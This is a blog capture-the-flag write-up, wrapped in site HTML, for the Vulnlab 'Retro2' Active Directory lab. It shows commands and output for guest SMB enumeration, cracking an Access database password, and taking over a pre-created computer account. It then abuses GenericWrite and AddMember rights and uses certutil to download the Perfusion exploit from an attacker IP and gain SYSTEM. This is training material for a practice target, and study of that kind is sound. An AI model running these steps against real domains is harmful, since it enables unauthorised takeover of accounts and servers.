@@ -1,0 +1,231 @@
+<!doctype html>
+<html lang="en">
+<head>
+
+
+<meta charset="utf-8"><script>(function(){try{var T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},here="claude",root=T[here],L=location,p=L.pathname;var q=new URLSearchParams(L.search),want=q.get("theme"),picked=want&&T[want]!==undefined;if(picked){localStorage.setItem("blog-theme",want);q.delete("theme")}else{want=localStorage.getItem("blog-theme")}var s=q.toString();s=s?"?"+s:"";var lost=p.indexOf(root)!==0;for(var k in T){if(k!==here&&T[k].length>root.length&&p.indexOf(T[k])===0)lost=true}if(want&&want!==here&&T[want]!==undefined&&!lost){L.replace(T[want]+p.slice(root.length)+s+L.hash);return}if(picked){history.replaceState(null,"",p+s+L.hash);var st=document.createElement("style");st.textContent="@view-transition{navigation:auto}";document.head.appendChild(st)}}catch(e){}})()</script><style>.tsw{position:relative}.tsw summary{list-style:none;cursor:pointer;user-select:none}.tsw summary::-webkit-details-marker{display:none}.tsw-menu{position:absolute;right:0;top:calc(100% + .4rem);z-index:50;display:grid;min-width:9.5rem;padding:.3rem;border:1px solid var(--line);border-radius:8px;background:var(--bg);box-shadow:0 6px 24px rgba(0,0,0,.18)}.tsw-menu a{display:block;padding:.35rem .6rem;border-radius:5px;color:var(--fg);text-decoration:none;white-space:nowrap;box-shadow:none}.tsw-menu a:hover{background:var(--surface)}.tsw-menu a[aria-current]{color:var(--accent)}.tsw-menu a[aria-current]::after{content:" ✓"}@media print{.tsw{display:none}}.nav .tsw summary{color:var(--muted)}.nav .tsw summary:hover,.nav .tsw[open] summary{color:var(--accent)}.nav .tsw-menu a{color:var(--fg)}@media (max-width:40rem){.site-header{position:relative}.nav .tsw{position:static}.nav .tsw-menu{top:100%}}</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Retro2 - Vulnlab · serioton</title>
+
+<meta name="description" content="Pre-Windows 2000 Computers, ACLs, RpcEptMapper registry key exploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Retro2 - Vulnlab">
+<meta property="og:url" content="https://seriotonctf.github.io/claude/Retro2-Vulnlab/index.html">
+<meta property="og:site_name" content="serioton">
+<meta property="og:description" content="Pre-Windows 2000 Computers, ACLs, RpcEptMapper registry key exploit">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://seriotonctf.github.io/img/thumbnails/retro2-vulnlab.png">
+<meta property="article:published_time" content="2024-08-25T18:53:34.000Z">
+<meta property="article:modified_time" content="2026-05-24T17:14:31.000Z">
+<meta property="article:author" content="serioton">
+<meta property="article:tag" content="active directory">
+<meta property="article:tag" content="acl abuse">
+<meta property="article:tag" content="vulnlab">
+<meta property="article:tag" content="pre-windows 2000 computers">
+<meta property="article:tag" content="rpceptmapper">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://seriotonctf.github.io/img/thumbnails/retro2-vulnlab.png">
+<link rel="canonical" href="https://seriotonctf.github.io/Retro2-Vulnlab/">
+<meta name="theme-color" content="#faf9f5" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#1f1e1d" media="(prefers-color-scheme: dark)">
+
+<link rel="icon" href="/claude/img/iconcat.png">
+
+
+<link rel="alternate" type="application/atom+xml" title="serioton" href="/claude/atom.xml">
+
+<link rel="preload" as="font" type="font/woff2" href="/claude/fonts/iosevka-latin-400-normal.woff2" crossorigin>
+<link rel="stylesheet" href="/claude/css/claude.css">
+<script>try{var t=localStorage.getItem('theme');if(t==='dark'||t==='light')document.documentElement.dataset.theme=t}catch(e){}</script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<header class="site-header wrap">
+  <a class="brand" href="/claude/"><span class="spark" aria-hidden="true">✻</span> serioton</a>
+  <nav class="nav" aria-label="main">
+    
+    <a href="/claude/archives/">/archives</a>
+    
+    <a href="/claude/categories/">/categories</a>
+    
+    <a href="/claude/tags/">/tags</a>
+    
+    <a href="/claude/about/">/about</a>
+    
+    <details class="tsw"><summary title="switch the blog theme">/skin</summary><div class="tsw-menu"><a data-switch="butterfly" href="/?theme=butterfly">Butterfly</a><a data-switch="claude" href="/claude/?theme=claude" aria-current="true">Claude Code</a><a data-switch="loaf" href="/loaf/?theme=loaf">Loaf</a></div></details>
+    <button type="button" data-theme-toggle title="switch between light and dark">/theme</button>
+  </nav>
+</header>
+
+<main id="main" class="wrap">
+
+
+
+
+<article class="post" data-post="Retro2 - Vulnlab">
+  <p class="you"><span aria-hidden="true">&gt;</span> cat posts/Retro2-Vulnlab.md</p>
+
+  <header class="tool post-head">
+    <p class="call"><b>Read</b>(posts/Retro2-Vulnlab.md)</p>
+    <p class="result">Read 233 lines</p>
+  </header>
+
+  <div class="say">
+    <h1>Retro2 - Vulnlab</h1>
+    <p class="lede">Pre-Windows 2000 Computers, ACLs, RpcEptMapper registry key exploit</p>
+    <div class="meta">
+      <time datetime="2024-08-25T18:53:34.000Z">2024-08-25</time>
+      <a href="/claude/categories/writeups/">writeups</a>
+      
+      <a href="/claude/tags/active-directory/" rel="tag">#active directory</a><a href="/claude/tags/acl-abuse/" rel="tag">#acl abuse</a><a href="/claude/tags/vulnlab/" rel="tag">#vulnlab</a><a href="/claude/tags/pre-windows-2000-computers/" rel="tag">#pre-windows 2000 computers</a><a href="/claude/tags/rpceptmapper/" rel="tag">#rpceptmapper</a>
+    </div>
+  </div>
+
+  
+
+  <div class="post-body">
+    
+    <nav class="todos" aria-label="table of contents">
+      <details>
+        <summary><b>Update Todos</b></summary>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NMAP"><span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB"><span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bloodhound"><span class="toc-text">Bloodhound</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#USER"><span class="toc-text">USER</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pre-Windows-2000-computers"><span class="toc-text">Pre-Windows 2000 computers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GenericWrite"><span class="toc-text">GenericWrite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AddMember"><span class="toc-text">AddMember</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROOT"><span class="toc-text">ROOT</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li></ol>
+      </details>
+    </nav>
+    
+    
+    <div class="prose">
+      <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Retro2 is an easy Active Directory box from Vulnlab that involves decrypting an MS Access database, Pre-Created Computer Accounts, GenericWrite, AddMember and finally exploiting an RpcEptMapper Registry Key vulnerability in Windows 7 &#x2F; Server 2008 R2.</p>
+<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.112.106</span><br><span class="line">Host is up (0.075s latency).</span><br><span class="line">Not shown: 65523 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">5722/tcp  open  msdfsr</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">49157/tcp open  unknown</span><br></pre></td></tr></table></figure>
+<p>From the Nmap scan, we can see that we are dealing with a Domain Controller, as indicated by the presence of DNS, Kerberos and LDAP.</p>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>Running Netexec without credentials reveals that we are dealing with a Windows Server 2008, which is quite old</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nxc smb 10.10.112.106</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)</span><br></pre></td></tr></table></figure>
+<p>Let’s see if we can enumerate shares using any username</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nxc smb retro2.vl -u &#x27;serio&#x27; -p &#x27;&#x27; --shares</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            [+] retro2.vl\serio: (Guest)</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            [*] Enumerated shares</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            Share           Permissions     Remark</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            -----           -----------     ------</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            ADMIN$                          Remote Admin</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            C$                              Default share</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            IPC$                            Remote IPC</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            NETLOGON                        Logon server share</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            Public          READ</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            SYSVOL                          Logon server share</span><br></pre></td></tr></table></figure>
+<p>It looks like we can enumerate shares with a guest account, and from the previous output, we can see a non-standard share named ‘Public’. Let’s connect via smbclient and see what files are inside</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>smbclient.py guest@retro2.vl -no-pass</span><br><span class="line out">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="line out"></span><br><span class="line out">Type help for list of commands</span><br><span class="line out"># use Public</span><br><span class="line out"># ls</span><br><span class="line out">drw-rw-rw-          0  Sat Aug 17 10:30:37 2024 .</span><br><span class="line out">drw-rw-rw-          0  Sat Aug 17 10:30:37 2024 ..</span><br><span class="line out">drw-rw-rw-          0  Sat Aug 17 10:30:37 2024 DB</span><br><span class="line out">drw-rw-rw-          0  Sat Aug 17 07:58:07 2024 Temp</span><br><span class="line out"># cd DB</span><br><span class="line out"># ls</span><br><span class="line out">drw-rw-rw-          0  Sat Aug 17 10:30:37 2024 .</span><br><span class="line out">drw-rw-rw-          0  Sat Aug 17 10:30:37 2024 ..</span><br><span class="line out">-rw-rw-rw-     876544  Sat Aug 17 10:30:34 2024 staff.accdb</span><br><span class="line out"># get staff.accdb</span><br><span class="line out">#</span><br></pre></td></tr></table></figure>
+<p>Inside the Temp directory in the Public share, there is a staff.accdb file that we can download to our local machine to examine it. Running the <code>file</code> command on it reveals that it’s a Microsoft Access database</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>file staff.accdb</span><br><span class="line out">staff.accdb: Microsoft Access Database</span><br></pre></td></tr></table></figure>
+<p>If we try to open it with Microsoft Access, it prompts us for a password. Luckily, there is an <code>office2john</code> script that we can use to extract the hash and then crack it with John the Ripper</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>office2john staff.accdb | tee hash</span><br><span class="line out">staff.accdb:$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683f4d8c4e9faf77d3c01f2433e56*7de0d4af8c54c33be322dbc860b68b4849f811196015a3f48a424a265d018235</span><br></pre></td></tr></table></figure>
+<p>As you can see, john successfully cracked the hash</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>j hash</span><br><span class="line out">Using default input encoding: UTF-8</span><br><span class="line out">Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])</span><br><span class="line out">Cost 1 (MS Office version) is 2013 for all loaded hashes</span><br><span class="line out">Cost 2 (iteration count) is 100000 for all loaded hashes</span><br><span class="line out">Will run 4 OpenMP threads</span><br><span class="line out">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line out">class08          (staff.accdb)</span><br><span class="line out">1g 0:00:00:15 DONE (2024-08-25 11:57) 0.06578g/s 303.1p/s 303.1c/s 303.1C/s chuchu..class08</span><br><span class="line out">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line out">Session completed.</span><br></pre></td></tr></table></figure>
+<p>Now, we can open the database with Microsoft Access and see what’s inside. There is a VBA script, and we can find some credentials for the ‘ldapreader’ user</p>
+<figure class="highlight vb"><table><tr><td class="code"><pre><span class="line">strLDAP = <span class="string">&quot;LDAP://OU=staff,DC=retro2,DC=vl&quot;</span></span><br><span class="line">strUser = <span class="string">&quot;retro2\ldapreader&quot;</span></span><br><span class="line">strPassword = <span class="string">&quot;&lt;REDACTED&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h2><p>With valid credentials in hand, we can run Bloodhound to gain a better understanding of the network and the permissions our user has</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nxc ldap 10.10.112.106 -u &#x27;ldapreader&#x27; -p &#x27;&lt;REDACTED&gt;&#x27; --bloodhound --dns-server 10.10.112.106 -c All --dns-tcp</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)</span><br><span class="line out">LDAP        10.10.112.106   389    BLN01            [+] retro2.vl\ldapreader:&lt;REDACTED&gt;</span><br><span class="line out">LDAP        10.10.112.106   389    BLN01            Resolved collection methods: acl, dcom, group, objectprops, localadmin, container, psremote, rdp, session, trusts</span><br><span class="line out">LDAP        10.10.112.106   389    BLN01            Done in 00M 15S</span><br><span class="line out">LDAP        10.10.112.106   389    BLN01            Compressing output into /home/serioton/.nxc/logs/BLN01_10.10.112.106_2024-08-25_115943_bloodhound.zip</span><br></pre></td></tr></table></figure>
+<p>Looking for an interesting path to the Domain Controller, we can see the following relationships:</p>
+<ul>
+<li>The computer Account FS01 is a member of the Domain Computers group.</li>
+<li>The Domain Computers group has <code>GenericWrite</code> over ADMWS01.</li>
+<li>ADMWS01 has the <code>AddSelf</code> permission over the Services group.</li>
+<li>Services group members can RDP to the Domain Controller BLN01.</li>
+</ul>
+<p><img src="/claude/claude/Retro2-Vulnlab/bloodhound-path.png" alt="BloodHound attack path to the domain controller"><br>This is an interesting path! First, we need to gain access to the computer account FS01. So, how are we going to do that?</p>
+<h1 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h1><h2 id="Pre-Windows-2000-computers"><a href="#Pre-Windows-2000-computers" class="headerlink" title="Pre-Windows 2000 computers"></a>Pre-Windows 2000 computers</h2><p>Back in 2022, <a target="_blank" rel="noopener" href="https://trustedsec.com/">TrustedSec</a> made a blog post about <a target="_blank" rel="noopener" href="https://trustedsec.com/blog/diving-into-pre-created-computer-accounts">Pre-Created Computer Accounts</a> that showcased a way to take them over. First, let’s see if that’s the case here using Netexec</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nxc smb retro2.vl -u &#x27;fs01$&#x27; -p &#x27;fs01&#x27;</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            [-] retro2.vl\fs01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</span><br></pre></td></tr></table></figure>
+<p>As you can see, Netexec shows as the following error message: <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>, which means that we have guessed the correct password for a computer account that has not been used yet. Great, now we have found the correct password for FS01. However, we cannot use this computer account yet because the password has not been changed, so let’s do that. We can use this tool by <a target="_blank" rel="noopener" href="https://github.com/api0cradle">Oddvar Moe</a> called <a target="_blank" rel="noopener" href="https://github.com/api0cradle/impacket/blob/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py">rpcchangepwd</a> </p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>python3 rpcchangepwd.py retro2.vl/fs01\$:fs01@10.10.112.106 -newpass P@ssw0rd</span><br><span class="line out">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="line out"></span><br><span class="line out">[*] Password was changed successfully.</span><br></pre></td></tr></table></figure>
+<p>We have successfully changed the FS01 computer account password. We can verify the new credentials using Netexec, which confirms they are valid</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nxc smb retro2.vl -u &#x27;fs01$&#x27; -p &#x27;P@ssw0rd&#x27;</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            [+] retro2.vl\fs01$:P@ssw0rd</span><br></pre></td></tr></table></figure>
+<h2 id="GenericWrite"><a href="#GenericWrite" class="headerlink" title="GenericWrite"></a>GenericWrite</h2><p>Now that we have control over FS01, we can abuse the GenericWrite permission we identified earlier. The typical techniques to abuse GenericWrite are:</p>
+<ul>
+<li>shadowCredentials (windows server 2016 or later)</li>
+<li>targetKerberoasting (the password should be weak enough to be cracked)</li>
+<li>Resource-Based Constrained Delegation</li>
+</ul>
+<p>However, since we are dealing with a Windows Server 2008, none of these techniques will work. So, what we can do in this case? Well, there is another attribute that we can write to, which is <code>unicodePwd</code>. This will allow us reset the password of “ADMWS01$”. To do this, We are going to use the following command:</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>net rpc password &#x27;ADMWS01$&#x27; Passw0rd1 -U retro2.vl/&#x27;fs01$&#x27;%P@ssw0rd -S BLN01.retro2.vl</span><br></pre></td></tr></table></figure>
+<p>We didn’t get any error messages from the previous output, so that should have worked successfully. However, We can still verify with Netexec</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nxc smb retro2.vl -u &#x27;ADMWS01$&#x27; -p &#x27;Passw0rd1&#x27;</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)</span><br><span class="line out">SMB         10.10.112.106   445    BLN01            [+] retro2.vl\ADMWS01$:Passw0rd1</span><br></pre></td></tr></table></figure>
+<p>It looks like the password has been successfully changed.</p>
+<h2 id="AddMember"><a href="#AddMember" class="headerlink" title="AddMember"></a>AddMember</h2><p>At this stage, we have control over the computer account ‘ADMWS01$,’ which has the <code>AddMember</code> permission over the ‘Services’ group. As we saw earlier, members of this group can RDP to the DC</p>
+<p><img src="/claude/claude/Retro2-Vulnlab/addmember.png" alt="BloodHound showing ADMWS01$ has AddMember over the Services group"><br>Since we have the credentials of the ldapreader user, we can add him to this group and RDP to the Domain Controller. We could use the <a target="_blank" rel="noopener" href="https://linux.die.net/man/8/net">net</a> tool, which is used for the administration of Samba and CIFS&#x2F;SMB clients. However, this time, I am going to use <a target="_blank" rel="noopener" href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a>.</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host 10.10.112.106 -d retro2.vl -u &#x27;ADMWS01$&#x27; -p &#x27;Passw0rd1&#x27; add groupMember &#x27;SERVICES&#x27; &#x27;ldapreader&#x27;</span><br><span class="line out">[+] ldapreader added to SERVICES</span><br></pre></td></tr></table></figure>
+<p>Great, it says our user has been added to the Services group. Therefore, we can RDP to the machine and retrieve the user flag</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>xfreerdp /u:&#x27;ldapreader&#x27; /p:&#x27;&lt;REDACTED&gt;&#x27; /v:10.10.112.106 /d:retro2.vl /tls-seclevel:0</span><br></pre></td></tr></table></figure>
+<p>Because who can resist a nostalgic rendezvous with an OS that refuses to call it quits?<br><img src="/claude/claude/Retro2-Vulnlab/rdp.png" alt="RDP session on the Windows Server 2008 domain controller"></p>
+<h1 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h1><p>Searching for a way to escalate our privileges leads us to the following blog posts by <a target="_blank" rel="noopener" href="https://itm4n.github.io/">itm4n</a>:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://itm4n.github.io/windows-registry-rpceptmapper-eop/">https://itm4n.github.io/windows-registry-rpceptmapper-eop/</a></li>
+<li><a target="_blank" rel="noopener" href="https://itm4n.github.io/windows-registry-rpceptmapper-exploit/">https://itm4n.github.io/windows-registry-rpceptmapper-exploit/</a></li>
+</ul>
+<p>which explain how to exploit a no-fix vulnerability in the RpcEptMapper registry key and provide us with a tool called <a target="_blank" rel="noopener" href="https://github.com/itm4n/Perfusion">Perfusion</a> that we can run on the target to obtain a system shell</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">PS C:\temp&gt; </span>certutil.exe -urlcache -f http://10.8.0.210/Perfusion.exe Perfusion.exe</span><br><span class="line out">****  Online  ****</span><br><span class="line out">CertUtil: -URLCache command completed successfully.</span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">PS C:\temp&gt; </span>.\Perfusion.exe -c cmd -i</span><br><span class="line out">[*] Created Performance DLL: C:\Users\LDAPRE~1\AppData\Local\Temp\2\performance_2016_1812_2.dll</span><br><span class="line out">[*] Created Performance registry key.</span><br><span class="line out">[*] Triggered Performance data collection.</span><br><span class="line out">[+] Exploit completed. Got a SYSTEM token! :)</span><br><span class="line out">[*] Waiting for the Trigger Thread to terminate... OK</span><br><span class="line out">[!] Failed to delete Performance registry key.</span><br><span class="line out">[*] Deleted Performance DLL.</span><br><span class="line out">Microsoft Windows [Version 6.1.7601]</span><br><span class="line out">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line out"></span><br><span class="line out">C:\temp&gt;whoami</span><br><span class="line out">nt authority\system</span><br></pre></td></tr></table></figure>
+<p>The exploit is successful, and we are SYSTEM 🐱. Let’s grab our root flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\temp&gt;type \users\administrator\Desktop\root.txt</span><br><span class="line">VL&#123;REDACTED&#125;</span><br></pre></td></tr></table></figure>
+<p>Even though we got a SYSTEM shell by running the exploit, understanding exactly what the exploit did is way more fruitful and fun. As <a target="_blank" rel="noopener" href="https://x.com/xct_de">xct</a> wisely says:<br><img src="/claude/claude/Retro2-Vulnlab/xct.png" alt="Quote from xct"></p>
+<h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://trustedsec.com/blog/diving-into-pre-created-computer-accounts">https://trustedsec.com/blog/diving-into-pre-created-computer-accounts</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers">https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/dacl/addmember#addmember">https://www.thehacker.recipes/ad/movement/dacl/addmember#addmember</a></li>
+<li><a target="_blank" rel="noopener" href="https://itm4n.github.io/windows-registry-rpceptmapper-eop/">https://itm4n.github.io/windows-registry-rpceptmapper-eop/</a></li>
+<li><a target="_blank" rel="noopener" href="https://itm4n.github.io/windows-registry-rpceptmapper-exploit/">https://itm4n.github.io/windows-registry-rpceptmapper-exploit/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/itm4n/Perfusion">https://github.com/itm4n/Perfusion</a></li>
+</ul>
+
+    </div>
+  </div>
+
+  <footer class="post-foot">
+    
+    <div class="tool">
+      <p class="call"><b>Search</b>(related: "Retro2-Vulnlab.md")</p>
+      <p class="result">Found 3 posts</p>
+      <ul class="list">
+        
+        <li><time datetime="2025-04-07T22:25:48.000Z">2025-04-07</time><a href="/claude/Shibuya-Vulnlab/">Shibuya - Vulnlab</a></li>
+        
+        <li><time datetime="2024-11-24T16:47:11.000Z">2024-11-24</time><a href="/claude/Redelegate-Vulnlab/">Redelegate - Vulnlab</a></li>
+        
+        <li><time datetime="2024-08-18T22:34:29.000Z">2024-08-18</time><a href="/claude/Reflection-Vulnlab/">Reflection - Vulnlab</a></li>
+        
+      </ul>
+    </div>
+    
+    
+    <nav class="neighbors" aria-label="more posts">
+      <a class="older" href="/claude/Reflection-Vulnlab/" rel="next"><small>← older</small>Reflection - Vulnlab</a>
+      <a class="newer" href="/claude/AD-ACLs-Cheatsheet/" rel="prev"><small>newer →</small>AD ACLs Cheatsheet</a>
+    </nav>
+    
+  </footer>
+</article>
+
+</main>
+<footer class="site-footer wrap">
+  
+  <p><span class="spark" aria-hidden="true">✻</span> © 2023–2026 serioton · <a href="/claude/atom.xml">rss</a></p>
+</footer>
+
+
+<div class="bar" data-index="/claude/search.xml">
+  <div class="wrap">
+    <div class="ask">
+      <div class="panel" hidden>
+        <div class="panel-head"></div>
+        <ol class="panel-list" role="listbox" aria-label="results"></ol>
+        <p class="panel-note" aria-live="polite"></p>
+      </div>
+      <label class="input">
+        <span aria-hidden="true">&gt;</span>
+        <input type="text" placeholder='Try "kerberos" or /help' autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="search posts or type a command">
+      </label>
+    </div>
+    <div class="status">
+      <button type="button" class="mode" data-mode-cycle title="shift+tab to cycle modes"><span data-mode-label>? for shortcuts</span></button>
+      <span class="status-right">
+        <button type="button" data-run="model" title="/model"><span data-model>Mythos 5.2</span></button>
+        <button type="button" data-run="effort" title="/effort"><span data-effort>high</span><span class="ctx-word"> effort</span></button>
+        <button type="button" class="ctx" data-run="context" title="/context"><span class="meter" aria-hidden="true"><i></i></span><span data-ctx>0%</span><span class="ctx-word"> context</span></button>
+      </span>
+    </div>
+  </div>
+  <script type="application/json" class="commands">[{"name":"/home","hint":"list all posts","url":"/claude/"},{"name":"/archives","hint":"open archives","url":"/claude/archives/"},{"name":"/categories","hint":"open categories","url":"/claude/categories/"},{"name":"/tags","hint":"open tags","url":"/claude/tags/"},{"name":"/about","hint":"open about","url":"/claude/about/"},{"name":"/rss","hint":"subscribe to the feed","url":"/claude/atom.xml"},{"name":"/resume","hint":"go back to a post you were reading","run":"resume"},{"name":"/random","hint":"read a random post","run":"random"},{"name":"/context","hint":"how much of the context window this page takes","run":"context"},{"name":"/compact","hint":"hide command output in code blocks, or bring it back","run":"compact"},{"name":"/model","hint":"pick the model shown in the status line","run":"model"},{"name":"/effort","hint":"set how hard the model thinks","run":"effort"},{"name":"/permissions","hint":"sites you allowed links to open without asking","run":"permissions"},{"name":"/status","hint":"current model, mode and setup","run":"status"},{"name":"/theme","hint":"switch between light and dark","run":"theme"},{"name":"/butterfly","hint":"switch the blog to the Butterfly theme","url":"/?theme=butterfly"},{"name":"/loaf","hint":"switch the blog to the Loaf theme","url":"/loaf/?theme=loaf"},{"name":"/export","hint":"print this page or save it as a PDF","run":"export"},{"name":"/clear","hint":"reset the mode, filters and prompt","run":"clear"},{"name":"/top","hint":"scroll to the top","run":"top"},{"name":"/help","hint":"list commands and shortcuts","run":"help"}]</script><script>(function(){var s=document.currentScript.previousElementSibling,T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},root="/claude/",p=location.pathname,rel=p.indexOf(root)===0?p.slice(root.length):"";try{var c=JSON.parse(s.textContent);c.forEach(function(x){var m=/\?theme=([\w-]+)$/.exec(x.url||"");if(m&&T[m[1]]!==undefined)x.url=T[m[1]]+rel+"?theme="+m[1]});s.textContent=JSON.stringify(c)}catch(e){}})()</script>
+  <script type="application/json" class="session">{"models":[{"name":"Mythos 5.2","id":"claude-mythos-5-2","hint":"most capable"},{"name":"Fable 5.2","id":"claude-fable-5-2","hint":"most capable, with added safeguards"},{"name":"Opus 5.5","id":"claude-opus-5-5","hint":"for complex work"},{"name":"Sonnet 5.5","id":"claude-sonnet-5-5","hint":"best for everyday tasks"},{"name":"Haiku 5.5","id":"claude-haiku-5-5","hint":"fastest"}],"window":200000,"permissions":true,"posts":24}</script>
+</div>
+
+<script src="/claude/js/claude.js" defer></script>
